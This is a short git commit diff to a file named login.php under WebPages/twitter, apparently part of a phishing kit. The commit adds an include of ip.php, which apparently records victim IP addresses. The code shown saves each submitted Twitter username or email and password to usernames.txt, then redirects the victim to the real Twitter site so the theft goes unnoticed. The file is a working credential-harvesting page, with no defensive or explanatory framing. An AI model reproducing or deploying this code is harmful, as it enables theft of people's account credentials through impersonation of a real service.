17b41290fa633c08f1bef106ccc60424ccc1f0cf
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-06-07 14:25:21 +0500

    Update login.php

--- WebPages/twitter/login.php
+++ WebPages/twitter/login.php
@@ -1,5 +1,6 @@
 <?php
 include 'base.php';
+include 'ip.php';
 
 file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['usernameOrEmail'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
 header('Location: https://twitter.com/');
